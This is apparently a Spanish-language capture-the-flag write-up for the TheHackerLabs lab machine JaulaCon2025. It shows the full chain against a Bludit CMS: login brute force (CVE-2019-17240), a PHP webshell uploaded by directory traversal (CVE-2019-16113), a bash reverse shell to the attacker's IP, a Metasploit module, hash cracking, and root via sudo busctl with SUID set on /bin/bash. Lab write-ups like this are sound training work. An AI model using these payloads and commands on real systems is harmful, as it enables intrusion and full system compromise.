---
title: "JaulaCon2025 - TheHackerLabs"
date: 2025-04-11
draft: false
slug: "THL-writeup-jaulaCon2025"
excerpt: "Esta fue una máquina sencilla, pero que necesita su trabajo. Después de analizar los escaneos, entramos a la página web activa en el puerto 80, que vemos que utiliza Virtual Hosting. Aplicando Hovering y registrando el dominio en el /etc/hosts, identificamos que la página es el CMS Bludit. Aplicando Fuzzing, descubrimos el login del CMS Bludit y lo analizamos para ver como se tramita la data del login, para aplicarle fuerza bruta. Al notar que la fuerza bruta será complicada de aplicar, buscamos algún Exploit que se le pueda aplicar, encontrando así un Exploit que aplica fuerza bruta. Utilizamos este Exploit para ganar acceso al login del CMS Bludit. Entre los Exploits encontrados, también encontramos uno que aplica Directory Traversal, que utilizamos para cargar una WebShell y con esto nos mandamos una Reverse Shell para ganar acceso a la máquina víctima. Enumerando la máquina, encontramos un archivo del CMS Bludit que contiene los hashes de las contraseñas de los usuarios, siendo que uno de estos hashes de un usuario es posible crackearlo en la página crackstation. Utilizamos la contraseña crackeada y su usuario, para ganar acceso a la máquina mediante el servicio SSH. Revisando los privilegios de nuestro usuario, descubrimos que podemos usar el binario busctl como Root, siendo esté binario que ocupamos para escalar privilegios, gracias a la guía de GTFOBins."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "CMS Bludit", "Web Enumeration", "Fuzzing", "Brute Force Attack", "Authentication Bruteforce Mitigation Bypass", "CVE-2019-17240", "Directory Traversal", "CVE-2019-16113", "System Recognition (Linux)", "Cracking Hash", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "searchsploit"
  - "mv"
  - "echo"
  - "Python3"
  - "nc"
  - "script"
  - "PHP"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: exploit/linux/http/bludit_upload_images_exec"
  - "wget"
  - "pspy64"
  - "Crackstation"
  - "ssh"
  - "sudo"
  - "busctl"
  - "chmod"
  - "bash"
links:
  - "https://www.exploit-db.com/exploits/48746"
  - "https://www.exploit-db.com/exploits/48942"
  - "https://www.exploit-db.com/exploits/48701"
  - "https://www.bludit.com/es/"
  - "https://github.com/DominicBreuker/pspy"
  - "https://crackstation.net/"
  - "https://gtfobins.github.io/gtfobins/busctl/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-jaulaCon2025/jaulaCon2025.jpeg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.240
PING 192.168.1.240 (192.168.1.240) 56(84) bytes of data.
64 bytes from 192.168.1.240: icmp_seq=1 ttl=64 time=2.50 ms
64 bytes from 192.168.1.240: icmp_seq=2 ttl=64 time=1.19 ms
64 bytes from 192.168.1.240: icmp_seq=3 ttl=64 time=1.51 ms
64 bytes from 192.168.1.240: icmp_seq=4 ttl=64 time=0.955 ms

--- 192.168.1.240 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 0.955/1.539/2.502/0.590 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.240 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 12:20 CST
Initiating ARP Ping Scan at 12:20
Scanning 192.168.1.240 [1 port]
Completed ARP Ping Scan at 12:20, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:20
Scanning 192.168.1.240 [65535 ports]
Discovered open port 80/tcp on 192.168.1.240
Discovered open port 22/tcp on 192.168.1.240
Completed SYN Stealth Scan at 12:20, 20.92s elapsed (65535 total ports)
Nmap scan report for 192.168.1.240
Host is up, received arp-response (0.00096s latency).
Scanned at 2025-04-11 12:20:19 CST for 21s
Not shown: 64844 closed tcp ports (reset), 689 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.22 seconds
           Raw packets sent: 72466 (3.188MB) | Rcvd: 64848 (2.594MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay dos puertos abiertos, y supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.240 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 12:21 CST
Nmap scan report for 192.168.1.240
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

|_http-generator: Bludit
|_http-title: Bienvenido a Bludit | BLUDIT
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que la página activa en el **puerto 80** se llama **Bludit**. Veamos de que se trata.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura1.png">
</p>

No se está cargando bien la máquina. Supongo que se está aplicando **Virtual Hosting**.

Si hacemos un poco de **hovering**, podemos encontrar un dominio:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura2.png">
</p>

Vamos a registrarlo en el `/etc/hosts` y luego recargamos la página:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura3.png">
</p>

Bien, ya se ve como debería.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura4.png">
</p>

Parece que nos reporta el uso de un CMS llamado **Bludit**.

Investiguemos de que es:

| **CMS Bludit** |
|:-----------:|
| *Bludit es una aplicación web gratuita y de código abierto que permite crear un sitio web o blog rápidamente, sin necesidad de una base de datos. Es un sistema de gestión de contenidos de tipo "flat-file", lo que significa que almacena el contenido en archivos JSON, lo que facilita su uso y administración.* |

Entonces, es una aplicación web que sirve como un blog.

Aparte de la página principal, parece que ya hay una publicación que se llama **Jaulacon2025**:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura5.png">
</p>

Pero al entrar en esta, no tendrá nada:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura6.png">
</p>

Por último, podemos visitar la página **Acerca de**, pero no tendrá algo que nos ayude:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura7.png">
</p>

Vamos a aplicar **Fuzzing** para ver que nos podemos encontrar.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.240/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.240/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000110:   200        136 L    376 W      4538 Ch     "0"                                                                                                                          
000000245:   301        0 L      0 W        0 Ch        "admin"                                                                                                                      
000003281:   200        21 L     171 W      1083 Ch     "LICENSE"                                                                                                                    
000045226:   200        136 L    376 W      4538 Ch     "http://192.168.100.53/"                                                                                                     
000095510:   403        9 L      28 W       279 Ch      "server-status"                                                                                                              
000104544:   200        136 L    376 W      4538 Ch     "%3FRID%3D2671"                                                                                                              

Total time: 4317.103
Processed Requests: 220545
Filtered Requests: 220539
Requests/sec.: 51.08633
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.240/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.240/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 200) [Size: 4541]
/admin                (Status: 301) [Size: 0] [--> http://jaulacon2025.thl/admin/]
/LICENSE              (Status: 200) [Size: 1083]
/server-status        (Status: 403) [Size: 279]
/%3FRID%3D2671        (Status: 200) [Size: 4541]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Encontramos el login de **Bludit**, vayamos a verlo:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura8.png">
</p>

Quizá podamos aplicar fuerza bruta.

### Analizando Login de Bludit {#login}

Vamos a tratar de capturar un inicio de sesión con **BurpSuite**, para ver que data se tramita:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura9.png">
</p>

Manda la captura al **Repeater** y envíala:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura10.png">
</p>

Parece que nos redirige a la ruta `/admin/login` y lo más importante que puedo ver, es que nos genera un **token CSRF** y una **cookie**.

Investiguemos que es ese token:

| **Token CSRF** |
|:-----------:|
| *Un token CSRF (Cross-Site Request Forgery token) es una medida de seguridad utilizada para proteger formularios web contra un tipo específico de ataque conocido como CSRF (falsificación de petición en sitios cruzados).* |

La cuestión aquí, es que tendríamos que utilizar el **token CSRF** como data para aplicar la fuerza bruta. 

El problema es saber, si dicho token es dinámico o estático, pues si es dinámico, daría problemas para aplicar la fuerza bruta con la herramienta **hydra**.

Podemos comprobarlo aplicando **curl** al login, buscando el token con **grep**, volver a esperar unos segundos y volver a aplicarlo:
```bash
curl -s http://192.168.1.240/admin/login | grep tokenCSRF
<h1 class="text-center"....id="jstokenCSRF" name="tokenCSRF" value="0ac7475569c42d68535a68c3e448368788d2f560">

# Espera unos segundos

curl -s http://192.168.1.240/admin/login | grep tokenCSRF
<h1 class="text-center"....id="jstokenCSRF" name="tokenCSRF" value="c1e54f96df317a3bb25daebf2dce7af9152761b9">
```
Es un token dinámico.

Tendremos que buscar otra forma para poder ganar acceso.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass {#Exploit1}

Buscando información sobre algún Exploit para **Bludit**, encontramos varios que están dedicados a aplicar fuerza bruta.

Aunque están dedicados a una versión en específica, siendo que no conocemos la versión que se está utilizando, no perdemos nada en probarlos, siempre y cuando no afecte de manera negativa a la aplicación web.

Esta vez, probaremos el siguiente:
* <a href="https://www.exploit-db.com/exploits/48746" target="_blank">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</a>

Y como está en la base de datos de **Exploit-DB**, lo tendremos en nuestro **Kali**:
```bash
searchsploit bludit 3.9.2
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                                 | php/webapps/48746.rb
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                       | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                                | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                          | multiple/webapps/48701.txt
Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated)                                                                                     | php/webapps/51541.py

|---|---|
Shellcodes: No Result
```
Es el primero.

Vamos a copiarlo en nuestro directorio de trabajo:
```bash
searchsploit -m php/webapps/48746.rb
  Exploit: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
      URL: https://www.exploit-db.com/exploits/48746
     Path: /usr/share/exploitdb/exploits/php/webapps/48746.rb
    Codes: CVE-2019-17240
 Verified: True
File Type: Ruby script, ASCII text
```

Analizando su forma de uso, necesitamos indicarle la URL de la página web, un usuario y un wordlists para encontrar la contraseña.

**Ojo**: puede que necesites instalar los siguientes módulos de **Ruby**:
```bash
sudo gem install docopt
sudo gem install http-cookie
```

El problema es que no tenemos un usuario, por lo que investigamos que usuarios podemos sacar de la página:
```bash
admin -> usuario por defecto de Bludit
Jaulacon2025
Jaulacon
jaulacon
bludit
```

Y probando cada uno en el Exploit, resulta que existe el **usuario Jaulacon2025**:
```bash
./48746.rb -r http://192.168.1.240 -u Jaulacon2025 -w /usr/share/wordlists/rockyou.txt
[*] Trying password: 123456
[*] Trying password: 12345
[*] Trying password: 123456789
...
[*] Trying password: juliana
[*] Trying password: cassandra

[+] Password found: cassandra
```
Tenemos su contraseña.

Vamos a probarla:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura11.png">
</p>

Y estamos dentro.

### Probando Exploit: Bludit 3.9.2 - Directory Traversal y Ganando Acceso a la Máquina Víctima {#Exploit2}

Como ya tenemos un usuario y contraseña válidos, es posible aplicar el **Exploit Bludit 3.9.2 - Directory Traversal**, que justamente necesita esto.

Vamos a copiarlo:
```bash
searchsploit -m multiple/webapps/48701.txt
  Exploit: Bludit 3.9.2 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/48701
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48701.txt
    Codes: CVE-2019-16113
 Verified: False
File Type: Python script, ASCII text executable
```

Analizando este Exploit, vemos varias cosillas:

* Lo principal, es que está hecho en **Python**, por lo que solo tendríamos que cambiarle el tipo de archivo para poder ejecutarlo.
* Tenemos instrucciones para crear una **Reverse Shell** de **PHP** que será almacenada en una imagen y luego crear un **archivo .htaccess** que será el que interprete el payload de la imagen.
* Tenemos instrucciones para modificar la URL, el usuario y la contraseña por los válidos para el login.
* Debemos abrir un listener que capturara la **Reverse Shell**.
* Y luego visitar el archivo creado en la ruta `url + /bl-content/tmp/temp/evil.png`, que ejecutara nuestra **Reverse Shell**.

Vamos a cambiar esto un poco, pues en vez de que se aplique una **Reverse Shell**, cargaremos una **WebShell de PHP**.

Esto porque si seguimos los pasos de cargar una **Reverse Shell**, no será una sesión estable por una tarea que se está ejecutando y que veremos más adelante.

Así que vayamos por pasos:

* Cambiando la extensión del Exploit a **.py**:
```bash
mv 48701.txt DT_Exploit.py
```

* Creando nuestra **WebShell de PHP**:
```bash
nano evil.png
-------------
<?php
	system($_REQUEST['cmd']);
?>
```

* Generando el **archivo .htaccess**:
```bash
echo "RewriteEngine off" > .htaccess
echo "AddType application/x-httpd-php .png" >> .htaccess
```

* Modificamos el Exploit para agregar la URL, el usuario y la contraseña:
```python
url = 'http://192.168.1.240'  # CHANGE ME
username = 'Jaulacon2025'  # CHANGE ME
password = 'cassandra'  # CHANGE ME
```

* Con esto listo, ejecutamos el Exploit:
```bash
python3 DT_exploit.py
cookie: b45c9uo1buvrvi0jp1ldfm6upi
csrf_token: d43ac503b3113001022bcb458f0d728d88b5077c
Uploading payload: evil.png
Uploading payload: .htaccess
```
Parece que funciono.

* Visitemos la **WebShell** y probemos a ejecutar un comando:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura12.png">
</p>

Funciono correctamente.

Ya solo tenemos que obtener una sesión.

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Ejecuta la siguiente **Reverse Shell** en la **WebShell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura15.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.240] 36898
bash: cannot set terminal process group (514): Inappropriate ioctl for device
bash: no job control in this shell
www-data@JaulaCon2025:/var/www/html/bl-content/tmp/temp$
```

Ya solo tenemos que obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2: Presiona CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso4:reset -> xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
www-data@JaulaCon2025:/var/www/html/bl-content/tmp/temp$ whoami
www-data
```
Listo.

### Utilizando Módulo bludit_upload_images_exec de Metasploit Framework para Explotar Bludit 3.9.2 {#Metasploit}

También podemos aplicar el **Directory Traversal** con el módulo `exploit/linux/http/bludit_upload_images_exec` de **Metasploit Framework**, pues está dirigido a la versión de **Bludit 3.9.2**, que ya comprobamos que está utilizando.

Inicia **Metasploit** y usa el módulo:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use exploit/linux/http/bludit_upload_images_exec
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/bludit_upload_images_exec) >
```

Configurémoslo:
```bash
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS cassandra
BLUDITPASS => cassandra
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER Jaulacon2025
BLUDITUSER => Jaulacon2025
msf6 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 192.168.1.240
RHOSTS => 192.168.1.240
```

Ejecútalo:
```bash
msf6 exploit(linux/http/bludit_upload_images_exec) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[+] Logged in as: Jaulacon2025
[*] Retrieving UUID...
[*] Uploading EchGsZJLeF.png...
[*] Uploading .htaccess...
[*] Executing EchGsZJLeF.png...
[*] Sending stage (40004 bytes) to 192.168.1.240
[+] Deleted .htaccess
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.240:51264) at 2025-04-11 19:38:34 -0600

meterpreter > getuid
Server username: www-data
```
Bien, ganamos acceso. 

Aunque no sé si la sesión de **Meterpreter** sea estable, si no lo es, podemos cambiar el payload.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Enumeración de Archivos del CMS Bludit {#enumLin}

Si revisamos el `/etc/passwd`, encontraremos un par de usuarios registrados y que parece que está instalado **MySQL**:
```bash
www-data@JaulaCon2025:/var/www/html/bl-content$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
...
...
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
JaulaCon2025:x:1001:1001::/home/JaulaCon2025:/bin/bash
```

Y revisando el directorio `/home`, encontraremos a los usuarios:
```bash
www-data@JaulaCon2025:/home$ ls -la
total 16
drwxr-xr-x  4 root         root         4096 Mar 25 19:42 .
drwxr-xr-x 18 root         root         4096 Oct 16 12:55 ..
drwxr-xr-x  2 JaulaCon2025 JaulaCon2025 4096 Mar 26 12:00 JaulaCon2025
drwx------  2 debian       debian       4096 Oct 16 13:00 debian
```
Pero no podremos ver el contenido de ninguno de los dos.

De ahí en fuera, no encontramos nada más.

Intente ejecutar **linpeas.sh**, pero no funciono bien, así que mejor ejecute **pspy64** para ver si hay alguna **tarea CRON** ejecutándose.

Puedes descargar **pspy64** de aquí:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>

Y lo puedes pasar abriendo un **servidor de Python** en tu máquina y luego usando **wget** en la máquina víctima:
```bash
www-data@JaulaCon2025:/tmp$ wget http://Tu_IP/pspy64
--2025-04-11 23:38:33--  http://Tu_IP/pspy64
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64       100%[===================>]   2.96M  --.-KB/s    in 0.05s   

2025-04-11 23:38:33 (53.9 MB/s) - 'pspy64' saved [3104768/3104768]
```

Así encontramos lo que nos estaba dando problemas al aplicar la **Reverse Shell** con el Exploit:
```bash
www-data@JaulaCon2025:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
...
2025/04/11 23:39:01 CMD: UID=0     PID=4851   | /bin/sh -e /usr/lib/php/sessionclean 
2025/04/11 23:39:01 CMD: UID=0     PID=4850   | /bin/sh -e /usr/lib/php/sessionclean 
2025/04/11 23:39:01 CMD: UID=0     PID=4854   | /bin/sh -e /usr/lib/php/sessionclean 
2025/04/11 23:39:01 CMD: UID=0     PID=4855   | /bin/sh /usr/sbin/phpquery -V 
2025/04/11 23:39:01 CMD: UID=0     PID=4858   | /bin/sh /usr/sbin/phpquery -V 
2025/04/11 23:39:01 CMD: UID=0     PID=4857   | /bin/sh /usr/sbin/phpquery -V 
2025/04/11 23:39:01 CMD: UID=0     PID=4859   | /bin/sh /usr/sbin/phpquery -V 
2025/04/11 23:39:01 CMD: UID=0     PID=4860   | /bin/sh /usr/sbin/phpquery -V 
2025/04/11 23:39:01 CMD: UID=0     PID=4861   | /bin/sh -e /usr/lib/php/sessionclean 
2025/04/11 23:39:01 CMD: UID=0     PID=4862   | /bin/sh -e /usr/lib/php/sessionclean 
```

Revisando este script, resulta que sirve para **limpiar sesiones caducadas de PHP**. Esto es parte del mecanismo de mantenimiento automático del sistema.

Es por eso que si ocupamos la **Reverse Shell de PHP** que indica el **Exploit Bludit 3.9.2 - Directory Traversal** será inestable.

De ahí en fuera, no encontramos nada más.

Pero, podemos revisar los archivos de **Bludit**:
```bash
www-data@JaulaCon2025:/var/www/html/bl-content$ ls
databases  pages  tmp  uploads	workspaces
```
Veamos qué nos encontramos por aquí.

### Enumeración de Archivos del CMS Bludit y Crackeando Hash MD5 en Crackstation.net {#Cracking}

El directorio **databases**, contiene algunos archivos interesantes:
```bash
www-data@JaulaCon2025:/var/www/html/bl-content$ cd databases/
www-data@JaulaCon2025:/var/www/html/bl-content/databases$ ls -la
total 1840
drwxr-xr-x 3 www-data www-data    4096 Mar 25 19:57 .
drwxr-xr-x 7 www-data www-data    4096 Mar 25 19:34 ..
-rw-r--r-- 1 www-data www-data     442 Mar 26 11:59 categories.php
-rw-r--r-- 1 www-data www-data    1160 Mar 26 11:59 pages.php
drwxr-xr-x 7 www-data www-data    4096 Mar 25 19:34 plugins
-rw-r--r-- 1 www-data www-data 1845188 Apr 11 21:37 security.php
-rw-r--r-- 1 www-data www-data    1430 Mar 26 12:39 site.php
-rw-r--r-- 1 www-data www-data    2308 Apr 11 21:39 syslog.php
-rw-r--r-- 1 www-data www-data      52 Mar 26 11:59 tags.php
-rw-r--r-- 1 www-data www-data    1893 Mar 25 19:57 users.php
```

Veamos qué dice ese archivo **users.php**:
```bash
www-data@JaulaCon2025:/var/www/html/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrador",
        "lastName": "",
        "role": "admin",
        "password": "67def80155faa894bfb132889e3825a2718db22f",
        "salt": "67e2f74795e73",
        "email": "",
...
...
...
    "Jaulacon2025": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "a0fcd99fe4a21f30abd2053b1cf796da628e4e7e",
        "salt": "bo22u72!",
...
...
...
    "JaulaCon2025": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "551211bcd6ef18e32742a73fcb85430b",
        "salt": "jejej",
        "email": "",
```
Parece que podemos ver los hashes de las contraseñas de los usuarios registrados en **Bludit**.

Podríamos tratar de crackearlos, pero en mi caso, no pude hacerlo.

Esto me lo explica **ChatGPT**, ya que el posible formato que se está ocupando para crear los hashes, siendo **SHA1(password + salt)**, da conflicto para crackearlo con **Hashcat y JohnTheRipper**.

Pues es el **salt**, el que da problemas.

Curiosamente, tenemos el hash del **usuario JaulaCon2025**, que existe dentro de la máquina víctima, parece que el **salt** no fue usado correctamente, lo que hace posible que podamos crackearlo.

Para hacerlo, usaremos la página **Crackstation**:
* <a href="https://crackstation.net/" target="_blank">Crackstation</a>

Copiamos el hash, lo pegamos en la página y lo crackeamos:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura13.png">
</p>

Excelente, tenemos la contraseña del **usuario JaulaCon2025** y parece que fue un **hash MD5**.

Podemos probarla en nuestra sesión actual o en una nueva apuntando al **servicio SSH**.

Yo haré lo segundo:
```bash
ssh JaulaCon2025@192.168.1.240
JaulaCon2025@192.168.1.240's password: 
Linux JaulaCon2025 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
Last login: Wed Mar 26 11:53:48 2025
JaulaCon2025@JaulaCon2025:~$ whoami
JaulaCon2025
```
Estamos dentro.

Ya podemos buscar la flag del usuario:
```bash
JaulaCon2025@JaulaCon2025:~$ ls
user.txt
JaulaCon2025@JaulaCon2025:~$ cat user.txt
...
```

### Escalando Privilegios con Binario busctl {#busctlPrivesc}

Revisemos los privilegios que tiene nuestro usuario:
```bash
JaulaCon2025@JaulaCon2025:~$ sudo -l
sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido
Matching Defaults entries for JaulaCon2025 on JaulaCon2025:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User JaulaCon2025 may run the following commands on JaulaCon2025:
    (root) NOPASSWD: /usr/bin/busctl
```
Muy bien, podemos usar el **binario busctl** como **Root**.

Podemos encontrar una forma de escalar privilegios usando este binario en la **guía GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/busctl/" target="_blank">GTFOBins: busctl</a>

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon2025/Captura14.png">
</p>

Vamos a aplicarlo:
```bash
JaulaCon2025@JaulaCon2025:~$ sudo /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
# /bin/bash -i
root@JaulaCon2025:/home/JaulaCon2025# 
root@JaulaCon2025:/home/JaulaCon2025# whoami
root
```
Funcionó.

Te recomiendo que le des **permisos SUID a la Bash**, pues esta sesión de **Root** es inestable y te puede sacar:
```bash
root@JaulaCon2025:/home/JaulaCon2025# chmod u+s /bin/bash
root@JaulaCon2025:/home/JaulaCon2025# exit
exit
# exit
Failed to set property LogLevel on interface org.freedesktop.systemd1.Manager: Transport endpoint is not connected
JaulaCon2025@JaulaCon2025:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
```

Ahora sí, busquemos la última flag:
```bash
JaulaCon2025@JaulaCon2025:~$ bash -p
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
